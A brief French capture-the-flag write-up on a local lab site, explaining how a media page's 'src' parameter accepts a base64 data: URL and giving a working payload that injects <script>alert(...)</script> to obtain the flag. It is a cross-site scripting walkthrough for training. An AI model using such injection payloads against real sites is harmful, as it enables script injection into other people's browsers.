En cliquant sur l'icone de la NSA, on atterit sur http://127.0.0.1:8080/index.php?page=media&src=nsa
On peux voir que la src du contenu est un URI. On peux donc modifier la source du contenu et y injecter le code que l'on souhaite, si on l'encode en base 64.
https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs
https://www.base64encode.org/

Si on remplace src=nasa par src=data:text/html;base64;PHNjcmlwdD5hbGVydCgnY291Y291b3VpYm9uc29pcicpPC9zY3JpcHQ+
La source sera maintenant le decode de la base64, a savoir la balise script que l'on a inserer en HTML : <script>alert('coucououibonsoir')</script>
On recupere le flag lorsque l'on reussi a changer la source du contenu.
